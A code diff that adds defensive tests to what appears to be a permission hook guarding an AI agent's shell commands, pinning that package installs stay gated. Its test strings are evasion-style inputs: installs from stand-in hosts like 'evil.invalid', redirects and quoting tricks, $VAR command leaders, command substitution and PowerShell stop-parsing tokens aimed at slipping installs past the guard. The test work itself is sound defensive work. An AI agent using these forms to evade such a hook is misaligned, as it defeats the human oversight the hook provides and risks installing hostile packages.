@@ -2638,6 +2638,135 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       });
     });
   });
+
+  // ----- 2026-11-08 pins: file-target redirections and $VAR command words (tests only, no source change) -----
+  // Every case here passes on main (745fb1c7). They record behavior that a later change must not lose.
+  // Today a redirect to a plain file word (> out, 2>err.log) is NOT removed from the command, so it reads
+  // as a source and asks. Whether to clear that is Dave's choice. These pins say only what must stay true
+  // either way: a redirect never hides a package or a source, and a $VAR before an install verb asks.
+  describe('redirection and variable-leader pins (must not change)', () => {
+    async function lockDir(): Promise<string> {
+      const { mkdtempSync, writeFileSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join } = await import('node:path');
+      const dir = mkdtempSync(join(tmpdir(), 'pig-pins-'));
+      writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
+      return dir;
+    }
+    const calm = { CLAUDE_AGENT_ID: '', CI: '' }; // an unattended session turns every ask into a deny
+
+    // A redirect never hides a package: the fresh package behind or before it is still caught.
+    it.each([
+      'npm i > out zz-fresh-b',
+      'npm i 2>> file zz-fresh-b',
+      'npm i 2>err.log zz-fresh-b',
+      'npm i &>log zz-fresh-b',
+      'npm i zz-fresh-b > out',
+      'npm i > out; npm i zz-fresh-b',
+      "bash -c 'npm i zz-fresh-b > out'",
+    ])('a redirect does not hide a fresh package: %j is gated', async (cmd) => {
+      gated(await runHook(cmd, { stub: FRESH, cwd: await lockDir(), env: calm }));
+    });
+
+    // A source next to a redirect still asks. The reason text is not pinned: today it may name the
+    // redirect target instead of the source, and a later change may fix that.
+    it.each([
+      'npm i left-pad 2>err.log ./evil',
+      'npm i left-pad > out ./evil',
+      'npm i left-pad &>file git+https://x/y',
+      'npm i left-pad 2>> file github:u/r',
+      'npm i left-pad > out https://e.invalid/x.tgz',
+      'pip install > out https://e.invalid/x.whl',
+      'npm i left-pad > out --registry http://evil.invalid',
+    ])('a source next to a redirect still gates: %j', async (cmd) => {
+      gated(await runHook(cmd, { stub: OLD, cwd: await lockDir(), env: calm }));
+    });
+
+    // A redirect that is glued, quoted, escaped or not one plain word stays as typed and still gates.
+    it.each([
+      'npm i left-pad >&file',
+      'npm i left-pad 2>&$FD',
+      'npm i left-pad 2>$FD',
+      'npm i left-pad > $FILE',
+      'npm i left-pad > out$X',
+      'npm i left-pad > "my log"',
+      "npm i left-pad > 'out'",
+      'npm i left-pad > > out',
+      'npm i left-pad > --registry http://evil.invalid',
+      'npm i left-pad > $(npm i zz-fresh-b)',
+      'npm i left-pad>out',
+      "npm i '> out'",
+      'npm i "2>err.log"',
+      'npm i 2\\>err.log',
+    ])('still gates %j', async (cmd) => {
+      gated(await runHook(cmd, { stub: OLD, cwd: await lockDir(), env: calm }));
+    });
+
+    it('a redirect inside quotes is text, not an install', async () => {
+      expect(await runHook('echo "npm i zz-fresh-b > out"', { stub: FRESH, cwd: await lockDir(), env: calm })).toBeUndefined();
+    });
+
+    // A $VAR command word with an install verb asks "cannot parse". One segment cannot tell
+    // `PM=pnpm; $PM add evil` from a harmless tool, and a flag proves nothing. Nobody follows the assignment.
+    it.each([
+      '$PM add left-pad',
+      '$PM add left-pad --title x',
+      '${PM} add left-pad',
+      '"$PM" add left-pad',
+      '$L add foo',
+      '${L} add foo',
+      '"$L" add foo',
+      'PM=npm; $PM add left-pad',
+      'PM=pnpm; $PM add left-pad --title x',
+      'PM=yarn && $PM add left-pad',
+      'PM=npm; $PM install left-pad',
+      'PM=npm; $PM i left-pad',
+      'echo hi; $PM add left-pad',
+      'PM=node; PM=pnpm; $PM add left-pad',
+    ])('gates %j with the cannot-parse ask', async (cmd) => {
+      const r = await runHookFull(cmd, { stub: OLD, env: calm });
+      gated(r.decision);
+      expect(r.reason).toMatch(/cannot parse/i);
+    });
+
+    // The ask is narrow: a literal leader that is not a package manager is not touched.
+    it.each([
+      'node x.mjs add foo --title "x"',
+      'git add foo',
+      './tool add foo',
+      'python tool.py add foo',
+    ])('allows %j: the leader is not a variable that may be a manager', async (cmd) => {
+      expect(await runHook(cmd, { stub: OLD, env: calm })).toBeUndefined();
+    });
+
+    // PowerShell stop-parsing token (--%): everything after it is passed raw, so `> evil-pkg` is an argument,
+    // not a redirect. An earlier review flagged that the guard might read it as a redirect and allow the install.
+    const STOP_PARSING = 'pip install --% --trusted-host > evil-pkg';
+    const DC_START = 'mcp__plugin_desktop-commander_desktop-commander__start_process';
+
+    // Today each form is denied as an unpinned pip install of "evil-pkg": the target after > is read as a package.
+    const stopParsingGated = async (cmd: string, tool: string) => {
+      const r = await runHookFull(cmd, { tool, stub: OLD, cwd: await lockDir(), env: calm });
+      gated(r.decision);
+      expect(r.reason).toMatch(/evil-pkg/);
+    };
+
+    it('gates the PowerShell stop-parsing token in a PowerShell command', async () => {
+      await stopParsingGated(STOP_PARSING, 'PowerShell');
+    });
+
+    it('gates the PowerShell stop-parsing token in a desktop-commander command', async () => {
+      await stopParsingGated(STOP_PARSING, DC_START);
+    });
+
+    it.each([
+      `pwsh -Command "${STOP_PARSING}"`,
+      `pwsh -Command '${STOP_PARSING}'`,
+      `pwsh -c "${STOP_PARSING}"`,
+    ])('gates the PowerShell stop-parsing token in pwsh -Command from Bash: %j', async (cmd) => {
+      await stopParsingGated(cmd, 'Bash');
+    });
+  });
 });
 
 // F15 blocklist exact-string half: a probe. The blocklist compares version and name as plain strings.
